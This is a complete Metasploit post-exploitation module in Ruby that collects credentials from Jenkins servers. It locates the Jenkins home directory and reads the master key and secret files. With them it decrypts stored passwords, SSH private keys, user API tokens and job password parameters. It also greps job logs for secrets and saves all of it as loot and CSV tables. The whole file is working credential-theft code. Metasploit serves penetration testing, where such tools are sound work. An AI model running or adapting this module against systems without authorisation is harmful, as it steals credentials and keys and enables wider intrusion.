require 'nokogiri'
require 'base64'
require 'digest'
require 'openssl'
require 'sshkey'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Jenkins Credential Collector',
      'Description' => %q(
        This module can be used to extract saved Jenkins credentials, user
        tokens, SSH keys, and secrets. Interesting files will be stored in
        loot along with combined csv output.
      ),
      'License' => MSF_LICENSE,
      'Author' => [ 'thesubtlety' ],
      'Platform' => [ 'linux', 'win' ],
      'SessionTypes' => %w[shell meterpreter]
    ))
    register_options(
      [  OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),
         OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])
      ])

    @nodes = []
    @creds = []
    @ssh_keys = []
    @api_tokens = []
  end

  def report_creds(user, pass)
    return if user.empty? || pass.empty?
    credential_data = {
      origin_type: :session,
      post_reference_name: self.fullname,
      private_data: pass,
      private_type: :password,
      session_id: session_db_id,
      username: user,
      workspace_id: myworkspace_id
    }

    create_credential(credential_data)
  end

  def parse_credentialsxml(file)
    vprint_status("Parsing credentials.xml...")
    if exists?(file)
      f = read_file(file)
      if datastore['STORE_LOOT']
        loot_path = store_loot('jenkins.creds', 'text/xml', session, f, file)
        vprint_status("File credentials.xml saved to #{loot_path}")
      end
    else
      print_error("Could not read credentials.xml...")
    end

    xml_doc = Nokogiri::XML(f)
    xml_doc.xpath("//com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl").each do |node|
      username = node.xpath("username").text
      password = decrypt(node.xpath("password").text)
      description = node.xpath("description").text
      print_good("Credentials found - Username: #{username} Password: #{password}")
      report_creds(username, password)
      @creds << [username, password, description]
    end

    xml_doc.xpath("//com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey").each do |node|
      cred_id = node.xpath("id").text
      username = node.xpath("username").text
      description = node.xpath("description").text
      passphrase = node.xpath("passphrase").text
      passphrase = decrypt(passphrase)
      private_key = node.xpath("//privateKeySource//privateKey").text
      private_key = decrypt(private_key) if !private_key.match?(/----BEGIN/)
      print_good("SSH Key found! ID: #{cred_id} Passphrase: #{passphrase || '<empty>' } Username: #{username} Description: #{description}")

      store_loot("ssh-#{cred_id}", 'text/plain', session, private_key, nil, nil) if datastore['STORE_LOOT']
      @ssh_keys << [cred_id, description, passphrase, username, private_key]

      begin
        k = OpenSSL::PKey::RSA.new(private_key, passphrase)
        key = SSHKey.new(k, passphrase: passphrase, comment: cred_id)
        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: self.refname,
          private_type: :ssh_key,
          private_data: key.key_object.to_s,
          username: cred_id,
          workspace_id: myworkspace_id
        }
        create_credential(credential_data)
      rescue OpenSSL::OpenSSLError => e
        print_error("Could not save SSH key to creds: #{e.message}")
      end
    end
  end

  def parse_users(file)
    f = read_file(file)
    fname = file.tr("\\", "/").split('/')[-2]
    vprint_status("Parsing user #{fname}...")

    username  = ""
    api_token = ""
    xml_doc = Nokogiri::XML(f)
    xml_doc.xpath("//user").each do |node|
      username = node.xpath("fullName").text
    end

    xml_doc.xpath("//jenkins.security.ApiTokenProperty").each do |node|
      api_token = decrypt(node.xpath("apiToken").text)
    end

    print_good("API Token found - Username: #{username} Token: #{api_token}")

    @api_tokens << [username, api_token]
    report_creds(username, api_token)
    store_loot("user-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
  end

  def parse_nodes(file)
    f = read_file(file)
    fname = file.tr("\\", "/").split('/')[-2]
    vprint_status("Parsing node #{fname}...")

    node_name   = ""
    description = ""
    host    = ""
    port    = ""
    cred_id = ""
    xml_doc = Nokogiri::XML(f)
    xml_doc.xpath("//slave").each do |node|
      node_name = node.xpath("name").text
      description = node.xpath("description").text
    end

    xml_doc.xpath("//launcher").each do |node|
      host = node.xpath("host").text
      port = node.xpath("port").text
      cred_id = node.xpath("credentialsId").text
    end

    @nodes << [node_name, host, port, description, cred_id]
    print_good("Node Info found - Name: #{node_name} Host: #{host} Port: #{port} CredID: #{cred_id}")
    store_loot("node-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
  end

  def parse_jobs(file)
    f = read_file(file)
    fname = file.tr("\\", "/").split('/')[-4]
    vprint_status("Parsing job #{fname}...")

    username = ""
    pw = ""
    job_name = file.split(/\/jobs\/(.*?)\/builds\//)[1]
    xml_doc = Nokogiri::XML(f)
    xml_doc.xpath("//hudson.model.PasswordParameterValue").each do |node|
      username = node.xpath("name").text
      pw = decrypt(node.xpath("value").text)
    end

    @creds << [username, pw, ""]
    print_good("Job Info found - Job Name: #{job_name} User: #{username} Password: #{pw}") if !pw.blank?
    store_loot("job-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
  end

  def pretty_print_gathered
    creds_table = Rex::Text::Table.new(
      'Header'  => 'Creds',
      'Indent'  => 1,
      'Columns' =>
        [
          'Username',
          'Password',
          'Description'
        ]
    )
    @creds.uniq.each { |e| creds_table << e }
    print_good("\n" + creds_table.to_s) if !creds_table.rows.count.zero?
    store_loot('all.creds.csv', 'text/plain', session, creds_table.to_csv, nil, nil) if datastore['STORE_LOOT']

    api_table = Rex::Text::Table.new(
      'Header'  => 'API Keys',
      'Indent'  => 1,
      'Columns' =>
        [
          'Username',
          'API Tokens'
        ]
    )
    @api_tokens.uniq.each { |e| api_table << e }
    print_good("\n" + api_table.to_s) if !api_table.rows.count.zero?
    store_loot('all.apitokens.csv', 'text/plain', session, api_table.to_csv, nil, nil) if datastore['STORE_LOOT']

    node_table = Rex::Text::Table.new(
      'Header'  => 'Nodes',
      'Indent'  => 1,
      'Columns' =>
        [
          'Node Name',
          'Hostname',
          'Port',
          'Description',
          'Cred Id'
        ]
    )
    @nodes.uniq.each { |e| node_table << e }
    print_good("\n" + node_table.to_s) if !node_table.rows.count.zero?
    store_loot('all.nodes.csv', 'text/plain', session, node_table.to_csv, nil, nil) if datastore['STORE_LOOT']

    @ssh_keys.uniq.each do |e|
      print_good("SSH Key")
      print_status(" ID: #{e[0]}")
      print_status(" Description: #{e[1]}") if !e[1].nil? || !e[1].empty?
      print_status(" Passphrase:  #{e[2]}") if !e[2].nil? || !e[2].empty?
      print_status(" Username:    #{e[3]}") if !e[3].nil? || !e[3].empty?
      print_status("\n#{e[4]}")
    end
    ssh_output = @ssh_keys.each { |e| e.join(",") + "\n\n\n" }
    store_loot('all.sshkeys', 'text/plain', session, ssh_output, nil, nil) if datastore['STORE_LOOT'] && !ssh_output.empty?
  end

  def grep_job_history(path, platform)
    print_status("Searching through job history for interesting keywords...")
    case platform
    when "windows"
      results = cmd_exec("cmd.exe", "/c findstr /s /i \"secret key token password\" \"#{path}*log\"")
    when 'nix'
      results = cmd_exec("/bin/egrep", "-ir \"password|secret|key\" --include log \"#{path}\"")
    end
    store_loot('jobhistory.truffles', 'text/plain', session, results, nil, nil) if datastore['STORE_LOOT'] && !results.empty?
    print_good("Job Log truffles:\n#{results}") if !results.empty?
  end

  def find_configs(path, platform)
    case platform

    when 'windows'
      case session.type
      when 'meterpreter'
        configs = ""
        c = session.fs.file.search(path, "config.xml", true, -1) \
                   .concat(session.fs.file.search(path, "build.xml", true, -1))
        c.each { |f| configs << f["path"] + "\\" + f["name"] + "\n" }
      else
        configs = cmd_exec("cmd.exe", "/c dir /b /s \"#{path}\\*config.xml\" \"#{path}\\*build.xml\"")
      end
      configs.split("\n").each do |f|
        case f
        when /\\users\\/
          parse_users(f)
        when /\\jobs\\/
          parse_jobs(f)
        when /\\nodes\\/
          parse_nodes(f)
        end
      end

    when 'nix'
      configs = cmd_exec("/usr/bin/find", "\"#{path}\" -name config.xml -o -name build.xml")
      configs.split("\n").each do |f|
        case f
        when /\/users\//
          parse_users(f)
        when /\/jobs\//
          parse_jobs(f)
        when /\/nodes\//
          parse_nodes(f)
        end
      end
    end
  end

  def get_key_material(home, platform)
    case platform
    when "windows"
      master_key_path = "#{home}\\secrets\\master.key"
      hudson_secret_key_path = "#{home}\\secrets\\hudson.util.Secret"
    when "nix"
      master_key_path = "#{home}/secrets/master.key"
      hudson_secret_key_path = "#{home}/secrets/hudson.util.Secret"
    end

    if exists?(master_key_path) && exists?(hudson_secret_key_path)
      @master_key = read_file(master_key_path).strip
      @hudson_secret_key = read_file(hudson_secret_key_path).strip

      if datastore['STORE_LOOT']
        loot_path = store_loot('master.key', 'application/octet-stream', session, @master_key)
        vprint_status("File master.key saved to #{loot_path}")
        loot_path = store_loot('hudson.util.secret', 'application/octet-stream', session, @hudson_secret_key)
        vprint_status("File hudson.util.Secret saved to #{loot_path}")
      end
    else
      print_error "Cannot read master.key or hudson.util.Secret..."
      print_error "Encrypted strings will not be able to be decrypted..."
      return
    end
  end

  def find_home(platform)
    print_status("Searching for Jenkins directory... This could take some time...")
    case platform
    when "windows"
      case session.type
      when 'meterpreter'
        home = session.fs.file.search(nil, "secret.key.not-so-secret")[0]["path"]
      else
        home = cmd_exec("cmd.exe", "/c dir /b /s c:\*secret.key.not-so-secret", timeout = 120).split("\\")[0..-2].join("\\").strip
      end
    when "nix"
      home = cmd_exec("find", "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout = 120).split('/')[0..-2].join('/').strip
    end
    fail_with(Failure::NotFound, "No Jenkins installation found or readable, exiting...") if !exist?(home)
    print_status("Found Jenkins installation at #{home}")
    home
  end

  def gathernix
    home = find_home("nix")
    get_key_material(home, "nix")
    parse_credentialsxml(home + '/credentials.xml')
    find_configs(home, "nix")
    grep_job_history(home + '/jobs/', "nix") if datastore['SEARCH_JOBS']
    pretty_print_gathered
  end

  def gatherwin
    home = find_home("windows")
    get_key_material(home, "windows")
    parse_credentialsxml(home + "\\credentials.xml")
    find_configs(home, "windows")
    grep_job_history(home + "\\jobs\\", "windows") if datastore['SEARCH_JOBS']
    pretty_print_gathered
  end

  def run
    case session.platform
    when 'linux'
      gathernix
    else
      gatherwin
    end
  end

  def decrypt_key(master_key, hudson_secret_key)
    # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c
    magic = '::::MAGIC::::'
    hashed_master_key = Digest::SHA256.digest(master_key)[0..15]
    intermediate = OpenSSL::Cipher.new('AES-128-ECB')
    intermediate.decrypt
    intermediate.key = hashed_master_key

    salted_final = intermediate.update(hudson_secret_key) + intermediate.final
    raise 'no magic key in a' if !salted_final.include?(magic)
    salted_final[0..15]
  end

  def decrypt_v2(encrypted)
    begin
      master_key = @master_key
      hudson_secret_key = @hudson_secret_key
      key = decrypt_key(master_key, hudson_secret_key)
      encrypted_text = Base64.decode64(encrypted).bytes

      iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)
      data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)
      if encrypted_text.length != (1 + 8 + iv_length + data_length)
        print_error("Invalid encrypted string: #{encrypted}")
      end
      iv = encrypted_text[9..(9 + iv_length)].pack('C*')[0..15]
      code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*').force_encoding('UTF-8')

      cipher = OpenSSL::Cipher.new('AES-128-CBC')
      cipher.decrypt
      cipher.key = key
      cipher.iv = iv

      text = cipher.update(code) + cipher.final
      text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
      text
    rescue StandardError => e
      print_error(e.to_s)
      return "Could not decrypt string"
    end
  end

  def decrypt_legacy(encrypted)
    # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c
    begin
      magic = '::::MAGIC::::'
      master_key = @master_key
      hudson_secret_key = @hudson_secret_key
      encrypted = Base64.decode64(encrypted)

      key = decrypt_key(master_key, hudson_secret_key)
      cipher = OpenSSL::Cipher.new('AES-128-ECB')
      cipher.decrypt
      cipher.key = key

      text = cipher.update(encrypted) + cipher.final
      text = text[0..(text.length - magic.size - 1)]
      text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
      text
    rescue StandardError => e
      print_error(e.to_s)
      return "Could not decrypt string"
    end
  end

  def decrypt(encrypted)
    return if encrypted.empty?
    if encrypted[0] == "{" && encrypted[-1] == "}"
      decrypt_v2(encrypted)
    else
      decrypt_legacy(encrypted)
    end
  end
end
